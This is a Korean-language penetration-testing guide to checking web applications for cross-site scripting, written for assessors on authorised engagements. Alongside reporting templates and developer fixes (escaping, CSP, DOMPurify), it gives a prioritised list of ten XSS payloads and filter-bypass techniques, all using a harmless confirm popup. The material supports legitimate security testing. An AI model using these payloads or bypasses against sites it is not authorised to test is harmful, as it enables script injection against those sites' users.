# XSS 점검 가이드 (Pro 버전 · Markdown)
> **대상 독자**: 취약점 진단 1년차~중급자를 위한 **실전형·가독성 강화** 문서입니다.  
> **목표**: “어디부터 어떻게”를 빠르게 판단하고, **증적과 보고서 품질**까지 끌어올리기.

---

<p align="center">
  <a href="#toc">🔗 목차로 이동</a> ·
  <a href="#quickstart">⏱️ 10분 퀵 스타트</a> ·
  <a href="#contexts">🎯 컨텍스트별 공략</a> ·
  <a href="#payloads">🧪 최소 페이로드 세트</a> ·
  <a href="#dom">⚙️ DOM XSS</a> ·
  <a href="#report">📝 보고 템플릿</a> ·
  <a href="#mitigation">🛡️ 조치 가이드</a>
</p>

---

## <a id="toc"></a>목차
- [안전·범위 공지](#safe)
- [10분 퀵 스타트](#quickstart)
- [컨텍스트 판별 & 대표 전략](#contexts)
- [최소 페이로드 세트 (우선순위 적용)](#payloads)
- [필터·치환 우회 전략](#filtering)
- [DOM XSS: 소스→싱크 추적](#dom)
- [증적 수집 체크리스트](#evidence)
- [보고 템플릿 (요약/상세)](#report)
- [조치 가이드 (개발팀 전달용)](#mitigation)
- [자주 하는 실수 & 정정](#pitfall)
- [부록: 인코딩/레퍼런스](#appendix)

---

## <a id="safe"></a>안전·범위 공지
> **합법·승인된 환경에서만** 테스트하세요. 고객사/사내 식별 정보는 공개 금지.

- 무단 테스트 금지, PoC는 **최소 영향(무해한 confirm/console 등)** 으로.
- 증적은 **마스킹**(도메인/토큰/계정/경로).
- CSP/보안 솔루션 우회는 **계약 범위** 내에서만 수행.

---

## <a id="quickstart"></a>10분 퀵 스타트 (현장용 체크리스트)
- [ ] 입력이 반영되는 **위치** 확인: 검색/댓글/프로필/쿼리스트링/해시/스토리지
- [ ] **반사형 / 저장형 / DOM 기반** 구분
- [ ] 화면/응답으로 **컨텍스트** 파악: HTML 본문 / 속성 / URL(JS) / JS 문자열
- [ ] 아래 **최소 페이로드(§ [🧪](#payloads))** 를 **위에서부터** 순서대로 시도
- [ ] 특수문자/길이/치환/블랙리스트 **반응 기록**
- [ ] **경로 바꿔 재시도**: POST↔GET, 다른 파라미터, 다른 화면/역할(관리자/모바일)
- [ ] DOM 의심 시 DevTools에서 **Sink 검색**: `innerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`
- [ ] 성공 시 **원요청/원이응답/브라우저 화면** 3종 캡처(+마스킹)
- [ ] 영향도: 트리거(무클릭/원클릭), 권한(게스트/로그인/관리자), 범위, CSP 적용 유무
- [ ] 간단 **조치 제안** 메모(§ [🛡️](#mitigation))

---

## <a id="contexts"></a>컨텍스트 판별 & 대표 전략
| 컨텍스트 | 화면에서 보이는 단서 | 1차 시도 | 비고 |
|---|---|---|---|
| **HTML 본문** | 내 입력이 문단/카드 등으로 **그대로 보임** | `<img src=x onerror=confirm('XSS_TEST')>` | `<script>` 차단 환경에서 유용 |
| **속성(Attribute)** | `value="내입력"` 등 속성 값 내부 | `" autofocus onfocus=confirm('XSS_TEST') x="` | 따옴표 종료→이벤트 삽입, 포커스 유도 |
| **URL(JS 스킴)** | `<a href="내입력">` | `<a href="javascript:confirm('XSS_TEST')">Click</a>` | CSP `javascript:` 차단 여부 확인 |
| **JS 문자열/식** | `var msg="내입력";` | `";confirm('XSS_TEST');//` | 문자열 종료→코드 주입 |
| **DOM 기반** | URL 해시/스토리지 값이 화면에 반영 | 주소 끝에 `#<img src=x onerror=confirm('XSS_TEST')>` | 코드에서 `location.hash` 참조를 먼저 확인 |

> 이벤트 지원은 요소별 차이 있음(예: `<input>`은 `onload` 없음). 포커스는 `autofocus`/`onfocus`/`tabindex` 활용.

---

## <a id="payloads"></a>최소 페이로드 세트 (우선순위 적용)
> **위→아래** 순으로 시도하며, 실패 지점을 근거로 컨텍스트/필터 가설을 갱신합니다.

1. HTML 본문  
   ```html
   <img src=x onerror=confirm('XSS_TEST')>
   ```
2. `<script>` 차단 환경  
   ```html
   <details onpointerover=confirm('XSS_TEST')></details>
   ```
3. 속성 내부 탈출  
   ```html
   " autofocus onfocus=confirm('XSS_TEST') x="
   ```
4. 공백 제한  
   ```html
   <svg/onload=confirm('XSS_TEST')>
   ```
5. JS 문자열 컨텍스트  
   ```js
   ";confirm('XSS_TEST');// 
   ```
6. 알림 함수 필터(단어)  
   ```html
   <svg onload="window['con'+'firm']('XSS_TEST')"></svg>
   ```
7. 괄호 차단(백틱)  
   ```html
   <img src=x onerror=confirm`XSS_TEST`>
   ```
8. 하이퍼링크 컨텍스트  
   ```html
   <a href="javascript:confirm('XSS_TEST')">Click</a>
   ```
9. DOM 해시 주입  
   ```text
   #<img src=x onerror=confirm('XSS_TEST')>
   ```
10. 꼬리 자르기(뒤에 문구 붙음)  
    ```html
    <script>confirm('XSS_TEST')</script><!--
    ```

> 인코딩 빠르게 순환: URL `%3C`, HTML `&#x3C;`, 유니코드 `<`, **더블 인코딩**.

---

## <a id="filtering"></a>필터·치환 우회 전략 (요약)
- **특수문자 제한**: `"`, `<`, `(`, `=`, `:` → 다른 컨텍스트로 전환, 인코딩 시도, 백틱(`) 검토
- **이벤트 핸들러 제한**: `onload/onerror/onclick` → `onpointerover/onfocus/onkeydown/ondrag`등 대체
- **단어 삭제/치환**: `<script>` → `<scr<script>ipt>` / 또는 `<svg onload=...>`로 전환
- **앞/뒤 추가문자**: 앞→태그 닫고 이탈, 뒤→`<!--` 주석으로 꼬리 제거
- **길이 제한**: 더 짧은 형태(핵심만), 인코딩 축약, 링크/리다이렉트형 PoC로 교체

> **CSP가 있으면** 인라인/`javascript:`/`data:`가 차단됩니다. 우선 `meta`/`script-src` 정책부터 확인하세요.

---

## <a id="dom"></a>DOM XSS: 소스→싱크 추적
1) **소스(Source)** 후보  
- `location.search`, `location.hash`, `document.referrer`, `localStorage/sessionStorage`, `postMessage`

2) **싱크(Sink)** 후보  
- `innerHTML/outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`  
- React/Vue: 일반적으로 안전하지만 **`dangerouslySetInnerHTML`** 사용 시 위험

3) **루틴**  
- 코드에서 소스→싱크 데이터 흐름 식별 → 싱크 직전에 **최소 페이로드** 1~2개만 시도 → 성공 시 조건/트리거 기록

---

## <a id="evidence"></a>증적 수집 체크리스트
- [ ] **재현 절차**: 경로→파라미터→페이로드→트리거(클릭/포커스 등)→결과 순서
- [ ] **스크린샷 3종**: (1) 원요청(파라미터), (2) 브라우저 화면(결과), (3) 원응답(반영 위치)
- [ ] **마스킹**: 도메인/토큰/쿠키/계정/경로
- [ ] **영향도 요약**: 트리거·권한·범위·CSP 유무·세션 탈취/피싱 가능성
- [ ] **조치 제안**: 출력 이스케이프·CSP·Sanitizer·템플릿 경계

---

## <a id="report"></a>보고 템플릿

<details>
<summary><strong>요약(Executive Summary)</strong></summary>

**제목**: XSS 취약점 (반사형/저장형/DOM)  
**영향**: 사용자 브라우저 내 임의 스크립트 실행 → 계정 탈취/피싱/세션 탈취 가능성  
**위험도**: High / Medium / Low (근거: 트리거·권한·CSP·재현 난이도)  
**조치 요약**: 컨텍스트별 이스케이프, CSP, DOMPurify, 템플릿 경계 준수  
</details>

<details>
<summary><strong>상세(재현·증적·조치)</strong></summary>

**① 재현 절차**  
1. 경로/화면: …  
2. 파라미터: …  
3. 페이로드:  
   ```html
   <img src=x onerror=confirm('XSS_TEST')>
   ```
4. 트리거: (예) 페이지 로드 시 자동 / 요소에 포커스 / 링크 클릭  
5. 결과: `confirm('XSS_TEST')` 팝업 발생 (스크린샷 첨부)

**② 증적**  
- 원요청 캡처(파라미터 강조)  
- 브라우저 화면(결과 팝업)  
- 원응답 내 반영 위치 하이라이트  

**③ 영향도 근거**  
- 권한: 비로그인 사용자도 트리거 가능 / 관리자 화면 한정 등  
- 범위: 단일 사용자 / 다수 사용자  
- 보호: CSP 미적용 / 부분 적용 (정책: …)

**④ 조치(개발팀용)**  
- 출력 이스케이프: HTML/속성/URL/JS **컨텍스트별** 적용  
- CSP: `script-src 'self'; object-src 'none'; base-uri 'none'`(+ nonce/hash 권장)  
- Sanitizer: 신뢰되지 않은 HTML은 **DOMPurify** 통과  
- 설계: `innerHTML`/`.html()` 사용 지양, 템플릿 엔진의 자동 이스케이프 사용  
</details>

---

## <a id="mitigation"></a>조치 가이드 (개발팀 전달용 요약)
- **출력 이스케이프**: 컨텍스트별 이스케이프(HTML/속성/URL/JS) 체계화
- **CSP**: 인라인/`javascript:`/`data:` 제한, 리포터 활성화
- **Sanitizer**: DOMPurify 등 검증된 라이브러리 채택
- **코드 규칙**: `innerHTML`·jQuery `.html()` 지양, React의 `dangerouslySetInnerHTML` 금지 원칙
- **리뷰 절차**: 신규 화면 출시에 **CSP·컨텍스트 테스트**를 게이트로 추가

---

## <a id="pitfall"></a>자주 하는 실수 & 정정
- `contentitable` 오타 → **`contenteditable`**  
- `<input>`에는 `onload` 없음 → **포커스 유도**로 대체(`autofocus/onfocus/tabindex`)  
- `document.window.href` 오기 → **`window.location.href`**  
- 한 화면 실패로 단정 금물 → **다른 경로/역할/기기**에서 재시도  
- “표준 페이로드만” 고집 금지 → **컨텍스트에 맞춘 짧은 페이로드**로

---

## <a id="appendix"></a>부록: 인코딩 & 레퍼런스
- **인코딩 치트**
  - URL: `%3Cscript%3E` / `%22` / `%28` …  
  - HTML 엔티티: `&#x3C;` / `&#34;` / `&#40;` …  
  - 유니코드: `<` / `"` / `(` …  
  - 더블 인코딩: `%2528` 등
- **연습장**: PortSwigger Academy, OWASP Juice Shop, DVWA
- **레퍼런스**: PortSwigger XSS Cheat Sheet

---

© 2025 XSS Checklist — 연구/내부 점검 용도
